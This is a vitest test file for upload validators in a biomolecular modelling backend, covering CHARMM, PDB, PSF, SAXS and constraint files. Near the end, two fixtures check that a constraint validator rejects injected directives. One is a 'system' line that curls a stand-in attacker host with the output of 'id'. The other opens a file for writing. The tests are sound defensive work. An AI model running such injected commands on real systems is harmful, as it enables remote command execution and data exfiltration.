import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { Express } from 'express'
import {
  fromCharmmGui,
  isCRD,
  isPsfData,
  noSpaces,
  isSaxsData,
  containsChainId,
  checkPdbResidues,
  isRNA,
  isValidConstInpFile
} from '../validationFunctions.js'

vi.mock('fs/promises', () => ({
  default: { readFile: vi.fn() }
}))

vi.mock('../../../middleware/loggers.js', () => ({
  logger: { info: vi.fn(), error: vi.fn(), warn: vi.fn() }
}))

import fs from 'fs/promises'

const mockFile = (): Express.Multer.File =>
  ({ path: '/fake/file' }) as Express.Multer.File

const mockReadFile = (content: string) => {
  vi.mocked(fs.readFile).mockResolvedValue(content as never)
}

beforeEach(() => vi.clearAllMocks())

// ---------------------------------------------------------------------------
// fromCharmmGui
// ---------------------------------------------------------------------------
describe('fromCharmmGui', () => {
  it('returns true when "CHARMM-GUI" appears in first 5 lines', async () => {
    mockReadFile('* CHARMM-GUI generated\nline2\n')
    expect(await fromCharmmGui(mockFile())).toBe(true)
  })

  it('returns false when "CHARMM-GUI" is absent', async () => {
    mockReadFile('line1\nline2\nline3\n')
    expect(await fromCharmmGui(mockFile())).toBe(false)
  })

  it('returns false when "CHARMM-GUI" appears after line 5', async () => {
    mockReadFile('a\nb\nc\nd\ne\nCHARMM-GUI\n')
    expect(await fromCharmmGui(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await fromCharmmGui(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isCRD
// ---------------------------------------------------------------------------
describe('isCRD', () => {
  it('returns true for valid CRD format (2 star lines + EXT marker)', async () => {
    mockReadFile('* title\n* subtitle\n     12345 EXT\n')
    expect(await isCRD(mockFile())).toBe(true)
  })

  it('returns true with up to 6 star lines', async () => {
    mockReadFile('* a\n* b\n* c\n* d\n* e\n* f\n     99 EXT\n')
    expect(await isCRD(mockFile())).toBe(true)
  })

  it('returns false when more than 6 star lines', async () => {
    mockReadFile('* a\n* b\n* c\n* d\n* e\n* f\n* g\nEXT\n')
    expect(await isCRD(mockFile())).toBe(false)
  })

  it('returns false when EXT marker is missing', async () => {
    mockReadFile('* title\n* subtitle\nno EXT here\n')
    expect(await isCRD(mockFile())).toBe(false)
  })

  it('returns false with only one star line', async () => {
    mockReadFile('* title\n     12345 EXT\n')
    expect(await isCRD(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await isCRD(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isPsfData
// ---------------------------------------------------------------------------
const validPsfContent = [
  'PSF EXT CMAP XPLOR',
  '',
  '       1 !NTITLE',
  ' REMARKS generated',
  '',
  '       2 !NATOM',
  '         1 PROA      1 ALA  N    NH1   -0.470000E+00   14.007000       0',
  '         2 PROA      1 ALA  HT1  HC     0.310000E+00    1.008000       0'
].join('\n')

describe('isPsfData', () => {
  it('returns true for a valid PSF file', async () => {
    mockReadFile(validPsfContent)
    expect(await isPsfData(mockFile())).toBe(true)
  })

  it('returns false when first line does not contain PSF', async () => {
    mockReadFile(
      validPsfContent.replace('PSF EXT CMAP XPLOR', 'XPLOR EXT CMAP')
    )
    expect(await isPsfData(mockFile())).toBe(false)
  })

  it('returns false when !NTITLE line is missing', async () => {
    const content = validPsfContent.replace(
      '       1 !NTITLE',
      '       1 !OTHER'
    )
    mockReadFile(content)
    expect(await isPsfData(mockFile())).toBe(false)
  })

  it('returns false when !NATOM line is missing', async () => {
    const content = validPsfContent.replace(
      '       2 !NATOM',
      '       2 !BONDS'
    )
    mockReadFile(content)
    expect(await isPsfData(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await isPsfData(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// noSpaces
// ---------------------------------------------------------------------------
describe('noSpaces', () => {
  it('returns true when filename has no spaces', async () => {
    const file = { name: 'myfile.pdb' } as File
    expect(await noSpaces(file)).toBe(true)
  })

  it('returns false when filename contains a space', async () => {
    const file = { name: 'my file.pdb' } as File
    expect(await noSpaces(file)).toBe(false)
  })

  it('returns false when filename contains a tab', async () => {
    const file = { name: 'my\tfile.pdb' } as File
    expect(await noSpaces(file)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isSaxsData
// ---------------------------------------------------------------------------
// The analysis rules themselves are covered in @bilbomd/bilbomd-types; these
// check that the backend applies them to the uploaded file.
const buildSaxsLines = (count: number, qScale = 1): string => {
  const lines: string[] = []
  for (let i = 0; i < count; i++) {
    const q = 0.01 + i * 0.002
    const intensity = 1000 * Math.exp(-(q * q * 900) / 3) + 1
    lines.push(
      `${(q * qScale).toFixed(4)}  ${intensity.toFixed(4)}  ${(intensity * 0.02).toFixed(4)}`
    )
  }
  return lines.join('\n')
}

describe('isSaxsData', () => {
  it('accepts well-formed data in Å⁻¹ unchanged', async () => {
    mockReadFile(buildSaxsLines(150))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(true)
    expect(result.units).toBe('A')
    expect(result.changed).toBe(false)
    expect(result.warnings).toEqual([])
  })

  it('warns but accepts fewer than 100 points', async () => {
    mockReadFile(buildSaxsLines(50))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(true)
    expect(result.warnings.join(' ')).toMatch(/Only 50 data points/)
  })

  it('detects and converts nm⁻¹', async () => {
    mockReadFile(buildSaxsLines(150, 10))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(true)
    expect(result.units).toBe('nm')
    expect(result.changed).toBe(true)
  })

  it('applies the q_units it is given', async () => {
    mockReadFile(buildSaxsLines(150, 10))
    const result = await isSaxsData(mockFile(), 'A')
    expect(result.units).toBe('A')
    expect(result.unitsSource).toBe('user')
  })

  it('rejects a file with no SAXS data', async () => {
    mockReadFile('this is not\nSAXS data\n')
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/No SAXS data found/)
  })

  it('returns valid:false and message on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toBe('Error reading SAXS file content')
  })
})

// ---------------------------------------------------------------------------
// containsChainId
// ---------------------------------------------------------------------------
describe('containsChainId', () => {
  it('returns true when ATOM line has chain ID at column 22', async () => {
    // PDB format: columns are 1-indexed; column 22 (0-indexed 21) = chain ID
    const line =
      'ATOM      1  N   ALA A   1      11.104  13.207  11.921  1.00 38.06           N'
    mockReadFile(line + '\n')
    expect(await containsChainId(mockFile())).toBe(true)
  })

  it('returns true for HETATM line with chain ID', async () => {
    const line =
      'HETATM    1  C1  LIG B   1       1.000   2.000   3.000  1.00  0.00           C'
    mockReadFile(line + '\n')
    expect(await containsChainId(mockFile())).toBe(true)
  })

  it('returns false when no ATOM/HETATM lines', async () => {
    mockReadFile('REMARK no atoms here\nEND\n')
    expect(await containsChainId(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await containsChainId(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// checkPdbResidues
// ---------------------------------------------------------------------------
// Each line gets its own residue number unless one is given
let nextResidueNumber = 1
const atomLine = (
  residue: string,
  record = 'ATOM  ',
  { chain = 'A', number = nextResidueNumber++, altLoc = ' ' } = {}
) =>
  `${record}    1  CA ${altLoc}${residue.padEnd(3)} ${chain}${String(number).padStart(4)}       1.000   2.000   3.000  1.00  0.00           C`

describe('checkPdbResidues', () => {
  it('returns valid:true for all-standard amino acids', async () => {
    const content = ['ALA', 'GLY', 'SER', 'TYR', 'VAL']
      .map((r) => atomLine(r.padEnd(3)))
      .join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:true for phosphorylated residues SEP, TPO, PTR', async () => {
    const content = ['SEP', 'TPO', 'PTR'].map((r) => atomLine(r)).join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:true for nucleotide residues (DNA/RNA)', async () => {
    const content = ['DA ', 'DC ', 'DG ', 'DT ', 'A  ', 'C  ', 'G  ', 'U  ']
      .map((r) => atomLine(r))
      .join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:true for supported carbohydrate residues', async () => {
    const content = ['NAG', 'BMA', 'MAN', 'GAL', 'SIA']
      .map((r) => atomLine(r))
      .join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:true for HOH (water is removed by pdb2crd.py)', async () => {
    mockReadFile(atomLine('HOH'))
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:true for HETATM lines with supported residues', async () => {
    mockReadFile(atomLine('NAG', 'HETATM'))
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:false with message listing unsupported residues', async () => {
    const content = [
      atomLine('ALA'),
      atomLine('TPO'),
      atomLine('UNK'),
      atomLine('MSE')
    ].join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/MSE/)
    expect(result.message).toMatch(/UNK/)
    expect(result.message).not.toMatch(/ALA/)
    expect(result.message).not.toMatch(/TPO/)
  })

  it('returns valid:true for common ion residues (MG, CA, ZN)', async () => {
    const content = [atomLine('MG '), atomLine('CA '), atomLine('ZN ')].join(
      '\n'
    )
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:true for HSD (CHARMM HIS variant)', async () => {
    mockReadFile(atomLine('HSD'))
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:false and message on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toBe('Error reading PDB file.')
  })

  it('ignores non-ATOM/HETATM lines', async () => {
    mockReadFile('REMARK  some remark\nHEADER  some header\nEND\n')
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('rejects a sugar that shares a chain and number with a protein residue', async () => {
    const content = [
      atomLine('ASP', 'ATOM  ', { chain: 'E', number: 215 }),
      atomLine('NAG', 'HETATM', { chain: 'E', number: 215 }),
      atomLine('PRO', 'ATOM  ', { chain: 'E', number: 216 })
    ].join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/chain E residue 215 \(ASP and NAG\)/)
    expect(result.message).not.toMatch(/216/)
  })

  it('lists at most three shared residue numbers', async () => {
    const content = [215, 216, 217, 218, 219]
      .flatMap((number) => [
        atomLine('ALA', 'ATOM  ', { number }),
        atomLine('NAG', 'HETATM', { number })
      ])
      .join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/residue 217 .* and 2 more/)
    expect(result.message).not.toMatch(/residue 218/)
  })

  it('accepts the same residue number in different chains', async () => {
    const content = [
      atomLine('ASP', 'ATOM  ', { chain: 'A', number: 215 }),
      atomLine('NAG', 'HETATM', { chain: 'B', number: 215 })
    ].join('\n')
    mockReadFile(content)
    expect((await checkPdbResidues(mockFile())).valid).toBe(true)
  })

  it('accepts waters and ions numbered like a protein residue', async () => {
    const content = [
      atomLine('ASP', 'ATOM  ', { number: 5 }),
      atomLine('HOH', 'HETATM', { number: 5 }),
      atomLine('ZN ', 'HETATM', { number: 5 })
    ].join('\n')
    mockReadFile(content)
    expect((await checkPdbResidues(mockFile())).valid).toBe(true)
  })

  it('accepts alternate conformers with different residue names', async () => {
    const content = [
      atomLine('SER', 'ATOM  ', { number: 9, altLoc: 'A' }),
      atomLine('THR', 'ATOM  ', { number: 9, altLoc: 'B' })
    ].join('\n')
    mockReadFile(content)
    expect((await checkPdbResidues(mockFile())).valid).toBe(true)
  })

  it('accepts CHARMM segments that share a chain letter and numbering', async () => {
    const charmmLine = (residue: string, segid: string) =>
      `ATOM      1  CA  ${residue} P   3       1.000   2.000   3.000  1.00  0.00      ${segid}`
    mockReadFile(
      [charmmLine('ILE', 'PROA'), charmmLine('ASN', 'PROB')].join('\n')
    )
    expect((await checkPdbResidues(mockFile())).valid).toBe(true)
  })

  it('accepts an insertion code that separates two residues', async () => {
    const content = [
      'ATOM      1  CA  ASP A 100       1.000   2.000   3.000  1.00  0.00           C',
      'ATOM      2  CA  GLY A 100A      1.000   2.000   3.000  1.00  0.00           C'
    ].join('\n')
    mockReadFile(content)
    expect((await checkPdbResidues(mockFile())).valid).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// isRNA
// ---------------------------------------------------------------------------
describe('isRNA', () => {
  const rnaAtomLine = (residue: string) =>
    `ATOM      1  P   ${residue} A   1       1.000   2.000   3.000  1.00  0.00           P`

  it('returns valid:true for file with only valid RNA nucleotides', async () => {
    const content = [
      rnaAtomLine('A'),
      rnaAtomLine('C'),
      rnaAtomLine('G'),
      rnaAtomLine('U')
    ].join('\n')
    mockReadFile(content)
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:false when HETATM lines are present', async () => {
    mockReadFile('HETATM    1  MG  MG  A   1       1.000   2.000   3.000\n')
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/HETATM/)
  })

  it('returns valid:false for invalid residue name', async () => {
    mockReadFile(rnaAtomLine('X') + '\n')
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/Invalid residue/)
  })

  it('returns valid:false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toBe('Error reading the file.')
  })
})

// ---------------------------------------------------------------------------
// isValidConstInpFile
// ---------------------------------------------------------------------------
describe('isValidConstInpFile', () => {
  const validPdbContent = [
    'define PROA sele segid PROA end',
    'cons fix sele PROA end',
    'return'
  ].join('\n')

  const validCrdContent = [
    'define ABCD sele segid ABCD end',
    'cons fix sele ABCD end',
    'return'
  ].join('\n')

  it('returns true for valid pdb-mode constraint file', async () => {
    mockReadFile(validPdbContent)
    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
  })

  it('returns true for valid crd_psf-mode constraint file', async () => {
    mockReadFile(validCrdContent)
    expect(await isValidConstInpFile(mockFile(), 'crd_psf')).toBe(true)
  })

  it('returns error when last line is not "return"', async () => {
    mockReadFile(
      'define PROA sele segid PROA end\ncons fix sele PROA end\nnotreturn'
    )
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/last line must be "return"/)
  })

  it('returns error when no "define" line', async () => {
    mockReadFile('cons fix sele PROA end\nreturn')
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/define/)
  })

  it('returns error when no "cons fix sele" line', async () => {
    mockReadFile('define PROA sele segid PROA end\nreturn')
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/cons fix sele/)
  })

  it('returns error for invalid pdb-mode segid format', async () => {
    mockReadFile(
      'define BADID sele segid BADID end\ncons fix sele BADID end\nreturn'
    )
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/segid must be/)
  })

  it('returns error for invalid crd_psf-mode segid (not 4 uppercase letters)', async () => {
    mockReadFile('define abc sele segid abc end\ncons fix sele abc end\nreturn')
    const result = await isValidConstInpFile(mockFile(), 'crd_psf')
    expect(result).toMatch(/segid must contain 4 uppercase letters/)
  })

  it('returns error string on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toBe('Error reading file')
  })

  it('returns error when file is empty', async () => {
    mockReadFile('')
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/last line must be "return"/)
  })

  it('rejects a file containing a "system" directive', async () => {
    const content = [
      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
      'cons fix sele fixed1 end',
      'system "curl https://attacker.example/?x=$(id)"',
      'return'
    ].join('\n')
    mockReadFile(content)
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/Disallowed keyword/)
  })

  it('rejects a file containing an "open" directive', async () => {
    const content = [
      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
      'cons fix sele fixed1 end',
      'open unit 10 write card name /tmp/evil',
      'return'
    ].join('\n')
    mockReadFile(content)
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/Disallowed keyword/)
  })

  it('accepts comment lines starting with "!" alongside valid keywords', async () => {
    const content = [
      '! constraint file header',
      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
      'cons fix sele fixed1 end',
      '! end of constraints',
      'return'
    ].join('\n')
    mockReadFile(content)
    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
  })

  it('accepts comment lines starting with "*" alongside valid keywords', async () => {
    const content = [
      '* CHARMM constraint file',
      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
      'cons fix sele fixed1 end',
      'return'
    ].join('\n')
    mockReadFile(content)
    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
  })

  it('accepts "cons harm" lines for harmonic constraints', async () => {
    const content = [
      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
      'cons fix sele fixed1 end',
      'cons harm force 10.0 sele fixed1 end',
      'return'
    ].join('\n')
    mockReadFile(content)
    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
  })
})
